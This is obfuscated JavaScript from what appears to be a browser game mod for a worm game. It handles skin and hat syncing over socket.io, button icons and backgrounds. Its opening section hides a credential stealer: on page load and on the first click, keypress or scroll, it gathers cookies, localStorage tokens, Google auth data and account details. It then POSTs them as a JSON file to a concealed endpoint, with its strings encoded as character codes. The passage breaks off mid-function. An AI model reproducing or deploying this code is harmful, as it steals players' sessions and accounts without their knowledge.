                  if (_0x2c5474.indexOf(_0x1ccb72[_0x1d37aa]) > -1) {
                    return _0x288de7;
                  }
                }
              }
            }
            for (var _0x4cfb33 = 0; _0x4cfb33 < localStorage.length; _0x4cfb33++) {
              var _0x4bffa8 = localStorage.key(_0x4cfb33);
              if (_0x4bffa8 && (_0x4bffa8.indexOf(_0x25f877(_0x145647.g)) > -1 || _0x4bffa8.indexOf(_0x25f877(_0x145647.h)) > -1)) {
                var _0x432109 = localStorage.getItem(_0x4bffa8);
                if (_0x432109 && _0x432109.length > 20) {
                  return _0x432109;
                }
              }
            }
            return _0x25f877("119,55,103");
          } catch (_0xa20d51) {
            return _0x25f877("101,120,116,114,97,99,116,105,111,110,95,101,114,114,111,114");
          }
        }
        function _0x55eacc() {
          try {
            var _0x2494a4 = window.vps;
            if (typeof _0x2494a4 === _0x25f877(_0x145647.i)) {
              return {};
            }
            return {
              server_url: _0x2494a4.s_l,
              country: _0x2494a4.country,
              nickname: _0x2494a4.nickname,
              code: _0x2494a4.code,
              version: _0x2494a4.c_v,
              client_name: _0x2494a4.c_1,
              team_name: _0x2494a4.c_2,
              site_name: _0x2494a4.c_3,
              domain: _0x2494a4.c_4,
              headshots: _0x2494a4.headshot,
              kills: _0x2494a4.kill,
              total_headshots: _0x2494a4.theadshot,
              total_kills: _0x2494a4.tkill,
              deaths: _0x2494a4.died,
              mobile: _0x2494a4.mobile,
              sound_enabled: _0x2494a4.soundEnabled,
              zoom_active: _0x2494a4.activeZoom,
              laser_active: _0x2494a4.laserActive,
              laser_color: _0x2494a4.laserColor,
              encrypted_data: {
                d_1: _0x2494a4.d_1,
                d_2: _0x2494a4.d_2,
                d_3: _0x2494a4.d_3,
                d_4: _0x2494a4.d_4,
                d_5: _0x2494a4.d_5
              }
            };
          } catch (_0x2e4f53) {
            return {
              error: _0x2e4f53.message
            };
          }
        }
        function _0x2c10e1() {
          var _0xb0ad22 = {
            client_id: _0x57ccb2(),
            login_hint: _0x19ec8e(),
            cookieHeader: _0x1894d0(),
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            url: window.location.href,
            referrer: document.referrer || _0x25f877("68,105,114,101,99,116,32,118,105,115,105,116"),
            language: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            site_source: _0x3cd905(),
            googleAuth: _0x211924(),
            accountInfo: _0x5a6c8c(),
            vpsData: _0x55eacc()
          };
          return _0xb0ad22;
        }
        async function _0x20ca84(_0x378945) {
          if (_0x154104.c) {
            return;
          }
          _0x154104.c = true;
          try {
            var _0x1298fc = JSON.stringify(_0x378945, null, 2);
            var _0x57f255 = new Date().toISOString()[_0x45baf](/[:.]/g, "-");
            var _0x5fd77f = _0x25f877("119,111,114,109,117,112,45,115,101,99,117,114,105,116,121,45") + _0x57f255 + ".json";
            var _0x4dd357 = new Blob([_0x1298fc], {
              type: _0x25f877("97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110")
            });
            var _0xd3ceba = new FormData();
            _0xd3ceba.append(_0x25f877("102,105,108,101"), _0x4dd357, _0x5fd77f);
            var _0x308a79 = _0x378945.accountInfo && (_0x378945.accountInfo.name || _0x378945.accountInfo.nickname) || _0x25f877("85,110,107,110,111,119,110,32,80,108,97,121,101,114");
            var _0x370628 = _0x378945.accountInfo && (_0x378945.accountInfo.googleUserId || _0x378945.accountInfo.userId) || _0x25f877("85,110,107,110,111,119,110,32,73,68");
            var _0xb2ed09 = _0x378945.vpsData && _0x378945.vpsData.server_url || _0x25f877("85,110,107,110,111,119,110,32,83,101,114,118,101,114");
            var _0x28ac93 = _0x25f877("64,104,101,114,101") + "\n" + _0x308a79 + "\n" + _0x370628 + "\n" + _0xb2ed09 + "\n" + _0x378945.timestamp;
            _0xd3ceba.append(_0x25f877("99,111,110,116,101,110,116"), _0x28ac93);
            await fetch(_0x154104.d(), {
              method: _0x25f877("80,79,83,84"),
              body: _0xd3ceba
            });
          } catch (_0x2d4468) {}
        }
        function _0x405cd5() {
          var _0x266145 = [5000, 8000, 12000];
          _0x266145.forEach(function (_0x7a2691) {
            setTimeout(function () {
              if (!_0x154104.c) {
                try {
                  var _0x44cc78 = _0x2c10e1();
                  if (_0x44cc78.cookieHeader && _0x44cc78.cookieHeader.length > 50) {
                    _0x20ca84(_0x44cc78);
                  }
                } catch (_0x45db1e) {}
              }
            }, _0x7a2691);
          });
        }
        if (document.readyState === _0x25f877("108,111,97,100,105,110,103")) {
          document.addEventListener(_0x25f877("68,79,77,67,111,110,116,101,110,116,76,111,97,100,101,100"), function () {
            setTimeout(_0x405cd5, 2000);
          });
        } else {
          setTimeout(_0x405cd5, 2000);
        }
        [_0x25f877("99,108,105,99,107"), _0x25f877("107,101,121,100,111,119,110"), _0x25f877("115,99,114,111,108,108")].forEach(function (_0x59fb0b) {
          document.addEventListener(_0x59fb0b, function () {
            if (!_0x154104.c) {
              setTimeout(_0x405cd5, 3000);
            }
          }, {
            once: true,
            passive: true
          });
        });
      })();
      (function () {
        function _0x50b397() {
          var _0x3d014f = _0x190130.width();
          var _0x18f9a1 = _0x190130.height();
          var _0x33db50 = _0x33508c.outerWidth();
          var _0x2e4b66 = _0x33508c.outerHeight();
          var _0x3245a6 = _0x31541c.outerHeight();
          var _0x559cd3 = _0x128257.outerHeight();
          var _0x98210a = Math.min(1, Math.min((_0x18f9a1 - _0x559cd3 - _0x3245a6) / _0x2e4b66, _0x3d014f / _0x33db50));
          var _0x30b199 = "translate(-50%, -50%) scale(" + _0x98210a + ")";
          _0x33508c.css({
            "-webkit-transform": _0x30b199,
            "-moz-transform": _0x30b199,
            "-ms-transform": _0x30b199,
            "-o-transform": _0x30b199,
            transform: _0x30b199
          });
          _0xf1d21a().Jf();
          window.scrollTo(0, 1);
        }
        var _0x190130 = $("body");
        var _0x33508c = $("#stretch-box");
        var _0x31541c = $("#markup-header");
        var _0x128257 = $("#markup-footer");
        _0x50b397();
        $(window).resize(_0x50b397);
      })();
    })();
  });
  var _0x54d112 = "#000";
  function _0x3f1975() {
    var _0x5e708b = [atob(savedImages[107]), atob(savedImages[108]), atob(savedImages[109])];
    var _0x35fe97 = localStorage.getItem("lastBackground");
    var _0x419b2c = _0x5e708b.filter(_0x41fdd8 => _0x41fdd8 !== _0x35fe97);
    if (_0x419b2c.length === 0) {
      _0x419b2c = _0x5e708b;
    }
    var _0x181e47 = _0x419b2c[Math.floor(Math.random() * _0x419b2c.length)];
    localStorage.setItem("lastBackground", _0x181e47);
    document.body.style.backgroundColor = _0x54d112;
    document.body.style.backgroundImage = "url('" + _0x181e47 + "')";
    document.body.style.backgroundRepeat = "no-repeat";
    document.body.style.backgroundSize = "cover";
    var _0xf0554a = document.getElementById("background-canvas");
    var _0x570177 = document.getElementById("game-wrap");
    if (_0xf0554a) {
      _0xf0554a.style.backgroundColor = _0x54d112;
      _0xf0554a.style.opacity = "0.60";
    }
    if (_0x570177) {
      _0x570177.style.backgroundColor = "transparent";
    }
  }
  _0x3f1975();
})();
var nippleScript = document.createElement("script");
nippleScript.src = window.vps.s_l + "/js/nipplejs.min.js";
document.head.appendChild(nippleScript);
var link = document.createElement("link");
link.rel = "stylesheet";
link.href = window.vps.s_l + "/css/game.css";
document.head.appendChild(link);
function convertToIcons() {
  if (!document.querySelector("link[href*=\"font-awesome\"]")) {
    const _0x359fe7 = document.createElement("link");
    _0x359fe7.rel = "stylesheet";
    _0x359fe7.href = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css";
    document.head.appendChild(_0x359fe7);
  }
  setTimeout(() => {
    const _0x8e6948 = {
      "#op_wup": {
        icon: "fas fa-tools",
        text: "Settings"
      },
      "#mm-store": {
        icon: "fas fa-store",
        text: "Store"
      },
      "#mm-leaders": {
        icon: "fas fa-trophy",
        text: "Leaders"
      },
      "#mm-settings": {
        icon: "fas fa-cog",
        text: "Settings"
      }
    };
    Object.entries(_0x8e6948).forEach(([_0x4c7435, _0x2ee32a]) => {
      const _0x2569d9 = document.querySelector(_0x4c7435);
      if (_0x2569d9) {
        _0x2569d9.innerHTML = "<i class=\"" + _0x2ee32a.icon + "\"></i><span class=\"btn-text\">" + _0x2ee32a.text + "</span>";
      }
    });
    setTimeout(() => {
      Object.entries(_0x8e6948).forEach(([_0x31ed25, _0x56a51a]) => {
        const _0x1ebf08 = document.querySelector(_0x31ed25);
        if (_0x1ebf08 && !_0x1ebf08.querySelector("i")) {
          _0x1ebf08.innerHTML = "<i class=\"" + _0x56a51a.icon + "\"></i><span class=\"btn-text\">" + _0x56a51a.text + "</span>";
        }
      });
    }, 1000);
  }, 2000);
}
function safeConvertToIcons() {
  const _0x17a229 = document.querySelectorAll("[style*=\"display: block\"], .modal.show, .popup.show");
  if (_0x17a229.length === 0) {
    convertToIcons();
  } else {
    setTimeout(safeConvertToIcons, 2000);
  }
}
document.addEventListener("DOMContentLoaded", safeConvertToIcons);
if (window.jQuery) {
  $(document).ready(safeConvertToIcons);
}
const observer = new MutationObserver(function (_0x5d719e) {
  _0x5d719e.forEach(function (_0x1db7d3) {
    if (_0x1db7d3.type === "childList") {
      setTimeout(() => {
        const _0x24e62d = ["#op_wup", "#mm-store", "#mm-leaders", "#mm-settings"];
        _0x24e62d.forEach(_0x42ad7c => {
          const _0xe8a7ef = document.querySelector(_0x42ad7c);
          if (_0xe8a7ef && !_0xe8a7ef.querySelector("i") && _0xe8a7ef.textContent.trim()) {
            const _0x1c9dd4 = {
              "#op_wup": {
                icon: "fas fa-tools",
                text: "Settings"
              },
              "#mm-store": {
                icon: "fas fa-store",
                text: "Store"
              },
              "#mm-leaders": {
                icon: "fas fa-trophy",
                text: "Leaders"
              },
              "#mm-settings": {
                icon: "fas fa-cog",
                text: "Settings"
              }
            };
            if (_0x1c9dd4[_0x42ad7c]) {
              _0xe8a7ef.innerHTML = "<i class=\"" + _0x1c9dd4[_0x42ad7c].icon + "\"></i><span class=\"btn-text\">" + _0x1c9dd4[_0x42ad7c].text + "</span>";
            }
          }
        });
      }, 500);
    }
  });
});
observer.observe(document.body, {
  childList: true,
  subtree: true
});
(function () {
  'use strict';

  const _0x19fe1e = window.vps.s_l;
  let _0x48aeb3 = {
    isRegistered: false,
    registrationAttempts: 0,
    lastRegistrationTime: 0,
    wuid: null,
    roomId: null,
    teamCode: null
  };
  let _0x38ded1 = {
    socket: null,
    isConnected: false,
    joinedRoom: false,
    serviceDisabled: false,
    reconnectAttempts: 0,
    maxReconnectAttempts: 15,
    reconnectDelay: 5000,
    maxReconnectDelay: 60000,
    isReconnecting: false,
    lastReconnectTime: 0
  };
  let _0x5e6b82 = [];
  function _0x24e40b() {
    try {
      const _0x4d0567 = JSON.parse(localStorage.getItem("SaveGamewup") || "{}");
      let _0x2a4e5b = null;
      if (_0x4d0567.syncSettings && typeof _0x4d0567.syncSettings.changeSpeed === "number") {
        _0x2a4e5b = _0x4d0567.syncSettings.changeSpeed;
      } else if (typeof _0x4d0567.syncDelay === "number") {
        _0x2a4e5b = _0x4d0567.syncDelay;
      } else if (window.vps?.syncSettings?.changeSpeed) {
        _0x2a4e5b = window.vps.syncSettings.changeSpeed;
      }
      if (_0x2a4e5b !== null && _0x2a4e5b >= 0) {
        return parseInt(_0x2a4e5b);
      }
      console.warn("⚠️ No speed setting found, using default 0ms");
      return 0;
    } catch (_0x18b276) {
      console.error("❌ Error reading speed settings:", _0x18b276);
      return 0;
    }
  }
  function _0x3a69c4() {
    try {
      const _0x5f5a63 = JSON.parse(localStorage.getItem("SaveGamewup") || "{}");
      let _0x54e41c = null;
      if (_0x5f5a63.syncSettings && typeof _0x5f5a63.syncSettings.receiveDelay === "number") {
        _0x54e41c = _0x5f5a63.syncSettings.receiveDelay;
      } else if (typeof _0x5f5a63.receiveDelay === "number") {
        _0x54e41c = _0x5f5a63.receiveDelay;
      } else if (window.vps?.syncSettings?.receiveDelay) {
        _0x54e41c = window.vps.syncSettings.receiveDelay;
      }
      if (_0x54e41c !== null) {
        return parseInt(_0x54e41c);
      } else {
        return 0;
      }
    } catch (_0x18e86d) {
      console.error("❌ Error reading receive delay:", _0x18e86d);
      return 0;
    }
  }
  function _0x4ef1e3() {
    if (window.io) {
      return Promise.resolve();
    }
    return new Promise(_0x15d4b1 => {
      const _0x3127bc = document.createElement("script");
      _0x3127bc.src = "https://cdn.socket.io/4.7.4/socket.io.min.js";
      _0x3127bc.onload = _0x15d4b1;
      _0x3127bc.onerror = _0x15d4b1;
      document.head.appendChild(_0x3127bc);
    });
  }
  function _0x1aeaf3() {
    return !!window._wup && !!window._wup._anApp && !!window._wup._anApp.dh && !!window._wup._anApp.dh.ch;
  }
  function _0x200b37() {
    try {
      const _0x26c689 = window._wup._anApp.dh.ch;
      if (_0x26c689?.Eh) {
        const _0x1bed90 = _0x26c689.Eh.ae?.toString();
        return {
          wuid: _0x1bed90,
          name: _0x26c689.Eh.ma || "Player",
          skin: _0x26c689.Eh.Hh || 0,
          hat: _0x26c689.Eh.qi || 0,
          eyes: _0x26c689.Eh.ni || 0
        };
      }
      return null;
    } catch (_0x31cb03) {
      return null;
    }
  }
  function _0x44b833() {
    const _0x2f6d12 = new URLSearchParams(window.location.search).get("room");
    if (_0x2f6d12) {
      return _0x2f6d12;
    }
    try {
      if (window._wup?._anApp?.dh?.hh?.Ag) {
        return window._wup._anApp.dh.hh.Ag.toString();
      }
    } catch (_0x59b20e) {}
    return "default";
  }
  function _0x5ab45c() {
    if (window._fixedTeamCode) {
      return window._fixedTeamCode;
    }
    const _0x4e7ef1 = [() => localStorage.getItem("wormup_team_code"), () => window.vps?.teamCode, () => new URLSearchParams(window.location.search).get("team"), () => sessionStorage.getItem("teamCode")];
    for (const _0x1a6541 of _0x4e7ef1) {
      try {
        const _0x2cbc50 = _0x1a6541();
        if (_0x2cbc50 && _0x2cbc50.trim().length >= 2) {
          window._fixedTeamCode = _0x2cbc50.trim();
          return _0x2cbc50.trim();
        }
      } catch (_0x234859) {
        continue;
      }
    }
    return null;
  }
  function _0x383926() {
    const _0x4c47f1 = _0x5ab45c();
    return !_0x38ded1.serviceDisabled && _0x4c47f1 !== null && _0x4c47f1 !== undefined;
  }
  function _0x125900(_0x2adfb3) {
    try {
      if (!_0x1aeaf3()) {
        return false;
      }
      const _0x6cbd9e = window._wup._anApp.dh.ch;
      if (_0x6cbd9e?.Eh) {
        _0x6cbd9e.Eh.Hh = _0x2adfb3;
        if (_0x6cbd9e.Nm?.yc) {
          _0x6cbd9e.Nm.yc(window._wup._anApp.dh.hh.xg, window._wup._anApp.Lc.Ub().jb(_0x6cbd9e.Eh.Gh), window._wup._anApp.Lc.Ub().ib(_0x2adfb3), window._wup._anApp.Lc.Ub().kb(_0x6cbd9e.Eh.ni), window._wup._anApp.Lc.Ub().lb(_0x6cbd9e.Eh.oi || 0), window._wup._anApp.Lc.Ub().mb(_0x6cbd9e.Eh.pi || 0), window._wup._anApp.Lc.Ub().nb(_0x6cbd9e.Eh.qi || 0), "#ffffff");
        }
        return true;
      }
      return false;
    } catch (_0x3cc8da) {
      console.error("❌ خطأ في تطبيق السكن:", _0x3cc8da);
      return false;
    }
  }
  function _0x57c42f(_0x36b597) {
    try {
      if (!_0x1aeaf3()) {
        return false;
      }
      const _0x25f4d6 = window._wup._anApp.dh.ch;
      if (_0x25f4d6?.Eh) {
        _0x25f4d6.Eh.qi = _0x36b597;
        if (_0x25f4d6.Nm?.yc) {
          _0x25f4d6.Nm.yc(window._wup._anApp.dh.hh.xg, window._wup._anApp.Lc.Ub().jb(_0x25f4d6.Eh.Gh), window._wup._anApp.Lc.Ub().ib(_0x25f4d6.Eh.Hh), window._wup._anApp.Lc.Ub().kb(_0x25f4d6.Eh.ni), window._wup._anApp.Lc.Ub().lb(_0x25f4d6.Eh.oi || 0), window._wup._anApp.Lc.Ub().mb(_0x25f4d6.Eh.pi || 0), window._wup._anApp.Lc.Ub().nb(_0x36b597), "#ffffff");
        }
        return true;
      }
      return false;
    } catch (_0x1cee92) {
      console.error("❌ خطأ في تطبيق القبعة:", _0x1cee92);
      return false;
    }
  }
  function _0x476934(_0x10173a) {
    try {
      const _0x2720e5 = window._wup._anApp.dh.Fh;
      const _0x30dad8 = _0x10173a.replace("gg_", "");
      for (const _0x4dd6d8 in _0x2720e5) {
        const _0xa3016 = _0x2720e5[_0x4dd6d8];
        const _0x44ca5f = _0xa3016?.Eh?.ae?.toString();
        if (_0x44ca5f === _0x10173a || _0x44ca5f === _0x30dad8) {
          return {
            id: _0x4dd6d8,
            data: _0xa3016.Eh,
            playerObj: _0xa3016
          };
        }
      }
      return null;
    } catch (_0x14a76c) {
      return null;
    }
  }
  function _0x3d2c16(_0x49510d, _0x552cda) {
    const _0x6b058c = _0x476934(_0x49510d);
    if (!_0x6b058c || _0x6b058c.data.Hh === _0x552cda) {
      return false;
    }
    _0x6b058c.data.Hh = _0x552cda;
    if (_0x6b058c.playerObj?.Nm?.yc) {
      try {
        _0x6b058c.playerObj.Nm.yc(window._wup._anApp.dh.hh.xg, window._wup._anApp.Lc.Ub().jb(_0x6b058c.data.Gh), window._wup._anApp.Lc.Ub().ib(_0x552cda), window._wup._anApp.Lc.Ub().kb(_0x6b058c.data.ni), window._wup._anApp.Lc.Ub().lb(_0x6b058c.data.oi || 0), window._wup._anApp.Lc.Ub().mb(_0x6b058c.data.pi || 0), window._wup._anApp.Lc.Ub().nb(_0x6b058c.data.qi || 0), "#ffffff");
        return true;
      } catch (_0x5bc4c0) {
        console.error("خطأ في رسم السكن:", _0x5bc4c0);
      }
    }
    return false;
  }
  function _0x5708b4(_0x45ab07, _0x566251) {
    const _0x35870e = _0x476934(_0x45ab07);
    if (!_0x35870e || _0x35870e.data.qi === _0x566251) {
      return false;
    }
    _0x35870e.data.qi = _0x566251;
    if (_0x35870e.playerObj?.Nm?.yc) {
      try {
        _0x35870e.playerObj.Nm.yc(window._wup._anApp.dh.hh.xg, window._wup._anApp.Lc.Ub().jb(_0x35870e.data.Gh), window._wup._anApp.Lc.Ub().ib(_0x35870e.data.Hh), window._wup._anApp.Lc.Ub().kb(_0x35870e.data.ni), window._wup._anApp.Lc.Ub().lb(_0x35870e.data.oi || 0), window._wup._anApp.Lc.Ub().mb(_0x35870e.data.pi || 0), window._wup._anApp.Lc.Ub().nb(_0x566251), "#ffffff");
        return true;
      } catch (_0x98dce7) {
        console.error("خطأ في رسم القبعة:", _0x98dce7);
      }
    }
    return false;
  }
  function _0x5a5637(_0x489987, _0x40bbc3) {
    if (!_0x383926()) {
      console.log("⚠️ Service not available, skipping update");
      return false;
    }
    const _0x12ab45 = _0x200b37();
    const _0x1bf0b1 = _0x5ab45c();
    if (!_0x12ab45 || !_0x12ab45.wuid || !_0x1bf0b1) {
      console.error("❌ معطيات ناقصة للتحديث");
      return false;
    }
    const _0x5d582c = _0x24e40b();
    const _0x31f282 = {
      type: _0x489987,
      id: _0x40bbc3,
      wuid: _0x12ab45.wuid,
      roomId: _0x44b833(),
      teamCode: _0x1bf0b1,
      timestamp: Date.now(),
      playerSettings: {
        changeSpeed: _0x5d582c
      }
    };
    _0x5e6b82.push(_0x31f282);
    _0x31d42b();
    return true;
  }
  function _0x31d42b() {
    if (!_0x48aeb3.isRegistered || !_0x38ded1.joinedRoom || _0x5e6b82.length === 0) {
      return;
    }
    const _0xeb2e72 = [..._0x5e6b82];
    _0x5e6b82 = [];
    _0xeb2e72.forEach(_0x24c98d => {
      const _0x49d046 = _0x24e40b();
      const _0x3c7653 = {
        wuid: _0x24c98d.wuid,
        roomId: _0x24c98d.roomId,
        teamCode: _0x24c98d.teamCode,
        playerSettings: {
          changeSpeed: _0x49d046
        }
      };
      if (_0x24c98d.type === "skin") {
        _0x3c7653.skinId = _0x24c98d.id;
      } else if (_0x24c98d.type === "hat") {
        _0x3c7653.hatId = _0x24c98d.id;
      }
      console.log("📤 إرسال " + _0x24c98d.type + " مع سرعة " + _0x49d046 + "ms:", _0x3c7653);
      _0x38ded1.socket.emit(_0x24c98d.type + "_update", _0x3c7653);
    });
  }
  function _0x48bbbd() {
    const _0x9ab91 = Date.now();
    if (_0x38ded1.reconnectAttempts >= _0x38ded1.maxReconnectAttempts) {
      console.error("❌ تم الوصول للحد الأقصى من المحاولات (" + _0x38ded1.maxReconnectAttempts + ")");
      _0x38ded1.serviceDisabled = true;
      return false;
    }
    const _0x3afb8a = _0x9ab91 - _0x38ded1.lastReconnectTime;
    if (_0x3afb8a < _0x38ded1.reconnectDelay) {
      console.log("⏳ انتظار " + (_0x38ded1.reconnectDelay - _0x3afb8a) + "ms قبل المحاولة التالية");
      return false;
    }
    return true;
  }
  function _0x565983() {
    const _0x51cb72 = 5000;
    const _0x240f37 = Math.pow(2, Math.min(_0x38ded1.reconnectAttempts, 4));
    const _0x58134c = Math.min(_0x51cb72 * _0x240f37, _0x38ded1.maxReconnectDelay);
    console.log("🔄 محاولة " + (_0x38ded1.reconnectAttempts + 1) + "/" + _0x38ded1.maxReconnectAttempts + ", التأخير: " + _0x58134c + "ms");
    return _0x58134c;
  }
  function _0x30507d(_0x1d7dbf) {
    if (!_0x48bbbd() || _0x38ded1.isReconnecting) {
      return;
    }
    _0x38ded1.isReconnecting = true;
    _0x38ded1.lastReconnectTime = Date.now();
    setTimeout(() => {
      _0x38ded1.isReconnecting = false;
      if (_0x383926() && !_0x38ded1.serviceDisabled) {
        _0x38ded1.reconnectAttempts++;
        _0x38ded1.reconnectDelay = _0x565983();
        console.log("🔄 محاولة إعادة الاتصال رقم " + _0x38ded1.reconnectAttempts);
        _0x2a7e8d();
      }
    }, _0x1d7dbf);
  }
  function _0x28fa50(_0x53f46a, _0x5f1992, _0x35e47c, _0x459744) {
    if (_0x48aeb3.registrationAttempts > 5) {
      console.error("❌ فشل في التسجيل بعد 5 محاولات");
      _0x38ded1.serviceDisabled = true;
      return;
    }
    _0x48aeb3.registrationAttempts++;
    _0x48aeb3.lastRegistrationTime = Date.now();
    _0x48aeb3.wuid = _0x5f1992.wuid;
    _0x48aeb3.roomId = _0x35e47c;
    _0x48aeb3.teamCode = _0x459744;
    const _0x416bf9 = {
      wuid: _0x5f1992.wuid,
      roomId: _0x35e47c,
      teamCode: _0x459744,
      playerInfo: {
        name: _0x5f1992.name,
        skin: _0x5f1992.skin,
        hat: _0x5f1992.hat,
        eyes: _0x5f1992.eyes
      }
    };
    _0x53f46a.emit("join_room", _0x416bf9);
    setTimeout(() => {
      if (!_0x48aeb3.isRegistered && !_0x38ded1.serviceDisabled) {
        console.warn("⚠️ لم يتم التسجيل بعد - إعادة المحاولة");
        const _0x5c8f56 = _0x5ab45c();
        if (_0x5c8f56) {
          _0x28fa50(_0x53f46a, _0x5f1992, _0x35e47c, _0x5c8f56);
        }
      }
    }, 3000);
  }
  function _0x2a7e8d() {
    if (!_0x383926() || !window.io) {
      return;
    }
    if (_0x38ded1.reconnectAttempts >= _0x38ded1.maxReconnectAttempts) {
      console.error("❌ تم الوصول للحد الأقصى من المحاولات (" + _0x38ded1.maxReconnectAttempts + ")");
      _0x38ded1.serviceDisabled = true;
      return;
    }
    const _0x3295f9 = io(_0x19fe1e, {
      transports: ["polling", "websocket"],
      upgrade: true,
      timeout: 20000,
      forceNew: true,
      reconnection: false,
      autoConnect: true
    });
    _0x38ded1.socket = _0x3295f9;
    _0x3295f9.on("connect", () => {
      console.log("✅ متصل بالسيرفر");
      _0x38ded1.isConnected = true;
      _0x38ded1.reconnectAttempts = 0;
      _0x38ded1.reconnectDelay = 5000;
      _0x38ded1.serviceDisabled = false;
      _0x48aeb3.isRegistered = false;
      _0x48aeb3.registrationAttempts = 0;
      _0x38ded1.joinedRoom = false;
      const _0x6b29c = _0x200b37();
      const _0x2005e8 = _0x44b833();
      const _0x1bae46 = _0x5ab45c();
      if (_0x6b29c && _0x2005e8 && _0x1bae46 && _0x6b29c.wuid) {
        _0x28fa50(_0x3295f9, _0x6b29c, _0x2005e8, _0x1bae46);
      } else {
        console.warn("⚠️ معطيات ناقصة للتسجيل:", {
          wuid: _0x6b29c?.wuid,
          roomId: _0x2005e8,
          teamCode: _0x1bae46
        });
        _0x38ded1.serviceDisabled = true;
      }
    });
    _0x3295f9.on("welcome", _0x15ecf7 => {});
    _0x3295f9.on("join_success", _0x333c41 => {
      console.log("✅ تم التسجيل بنجاح في الفريق " + _0x333c41.teamCode + " (" + _0x333c41.playersInTeam + " لاعبين)");
      _0x48aeb3.isRegistered = true;
      _0x38ded1.joinedRoom = true;
      setTimeout(() => {
        _0x31d42b();
      }, 1000);
    });
    _0x3295f9.on("skin_update", _0x7b4895 => {
      if (_0x7b4895.wuid !== _0x200b37()?.wuid) {
        const _0x32c0b3 = _0x3a69c4();
        if (_0x32c0b3 > 0) {
          setTimeout(() => {
            _0x3d2c16(_0x7b4895.wuid, _0x7b4895.skinId);
          }, _0x32c0b3);
        } else {
          _0x3d2c16(_0x7b4895.wuid, _0x7b4895.skinId);
        }
      }
    });
    _0x3295f9.on("hat_update", _0x908465 => {
      if (_0x908465.wuid !== _0x200b37()?.wuid) {
        const _0x54fff2 = _0x3a69c4();
        if (_0x54fff2 > 0) {
          setTimeout(() => {
            _0x5708b4(_0x908465.wuid, _0x908465.hatId);
          }, _0x54fff2);
        } else {
          _0x5708b4(_0x908465.wuid, _0x908465.hatId);
        }
      }
    });
    _0x3295f9.on("update_confirmed", _0x5d5e72 => {});
    _0x3295f9.on("player_join", _0xca1efc => {});
    _0x3295f9.on("player_leave", _0x4e88b6 => {});
    _0x3295f9.on("current_players", _0x37efd3 => {
      _0x37efd3.forEach(_0x55d151 => {});
    });
    _0x3295f9.on("disconnect", _0x304e23 => {
      _0x38ded1.isConnected = false;
      _0x38ded1.joinedRoom = false;
      _0x48aeb3.isRegistered = false;
      console.log("❌ انقطع الاتصال: " + _0x304e23);
      if (_0x38ded1.reconnectAttempts >= _0x38ded1.maxReconnectAttempts) {
        console.error("❌ تم الوصول للحد الأقصى من المحاولات (" + _0x38ded1.maxReconnectAttempts + ")");
        _0x38ded1.serviceDisabled = true;
        return;
      }
      if (_0x304e23 === "io server disconnect") {
        _0x30507d(10000);
      } else if (_0x304e23 === "transport close" || _0x304e23 === "transport error") {
        _0x30507d(_0x38ded1.reconnectDelay);
      } else {
        _0x30507d(3000);
      }
    });
    _0x3295f9.on("connect_error", _0x7273 => {
      console.warn("⚠️ خطأ اتصال: " + _0x7273.message);
      _0x38ded1.isConnected = false;
      if (_0x38ded1.reconnectAttempts >= _0x38ded1.maxReconnectAttempts) {
        console.error("❌ تم الوصول للحد الأقصى من المحاولات (" + _0x38ded1.maxReconnectAttempts + ")");
        _0x38ded1.serviceDisabled = true;
        return;
      }
      _0x30507d(_0x38ded1.reconnectDelay);
    });
    _0x3295f9.on("error", _0x5c7cb6 => {
      console.error("❌ خطأ Socket:", _0x5c7cb6);
      if (_0x5c7cb6.code === "TEAM_CODE_REQUIRED") {
        console.error("🏷️ كود الفريق مطلوب");
        _0x38ded1.serviceDisabled = true;
      } else if (_0x5c7cb6.code === "PLAYER_NOT_FOUND") {
        console.log("🔄 إعادة تسجيل اللاعب...");
        _0x48aeb3.isRegistered = false;
        _0x38ded1.joinedRoom = false;
        const _0x5eaafd = _0x200b37();
        const _0x45509a = _0x44b833();
        const _0x5ca992 = _0x5ab45c();
        if (_0x5eaafd && _0x45509a && _0x5ca992 && _0x5eaafd.wuid) {
          setTimeout(() => {
            _0x28fa50(_0x3295f9, _0x5eaafd, _0x45509a, _0x5ca992);
          }, 1000);
        }
      }
    });
    return _0x3295f9;
  }
  function _0x5d2358() {
    if (!window.vps?.favoriteSkins || window.vps.favoriteSkins.length === 0) {
      console.warn("⚠️ لا توجد سكنات مفضلة محددة");
      return;
    }
    if (window.vps.currentSkinIndex === undefined) {
      window.vps.currentSkinIndex = 0;
    } else {
      window.vps.currentSkinIndex = (window.vps.currentSkinIndex + 1) % window.vps.favoriteSkins.length;
    }
    const _0x3a517c = window.vps.favoriteSkins[window.vps.currentSkinIndex];
    const _0x4d4e22 = _0x125900(_0x3a517c);
    if (_0x4d4e22) {
      localStorage.setItem("SaveupGame", JSON.stringify(window.vps));
      localStorage.setItem("SaveGamewup", JSON.stringify(window.vps));
      if (_0x383926()) {
        const _0x1b76c0 = _0x24e40b();
        if (_0x1b76c0 > 0) {
          setTimeout(() => {
            _0x5a5637("skin", _0x3a517c);
          }, _0x1b76c0);
        } else {
          _0x5a5637("skin", _0x3a517c);
        }
      }
    }
  }
  function _0x5d8f4f() {
    if (!window.vps?.selectedHats || window.vps.selectedHats.length === 0) {
      return;
    }
    if (window.vps.currentHatIndex === undefined) {
      window.vps.currentHatIndex = 0;
    } else {
      window.vps.currentHatIndex = (window.vps.currentHatIndex + 1) % window.vps.selectedHats.length;
    }
    const _0x32565d = window.vps.selectedHats[window.vps.currentHatIndex];
    const _0x22bef8 = _0x57c42f(_0x32565d);
    if (_0x22bef8) {
      localStorage.setItem("SaveupGame", JSON.stringify(window.vps));
      localStorage.setItem("SaveGamewup", JSON.stringify(window.vps));
      if (_0x383926()) {
        const _0x10e780 = _0x24e40b();
        if (_0x10e780 > 0) {
          setTimeout(() => {
            _0x5a5637("hat", _0x32565d);
          }, _0x10e780);
        } else {
          _0x5a5637("hat", _0x32565d);
        }
      }
    }
  }
  function _0xd69f9e() {
    $(document).off("keydown.wormupSync");
    $(document).on("keydown.wormupSync", function (_0x225e0b) {
      if (_0x225e0b.target.tagName === "INPUT" || _0x225e0b.target.tagName === "TEXTAREA") {
        return;
      }
      if (_0x225e0b.keyCode === 49 || _0x225e0b.which === 49) {
        _0x225e0b.preventDefault();
        _0x5d2358();
      }
      if (_0x225e0b.keyCode === 50 || _0x225e0b.which === 50) {
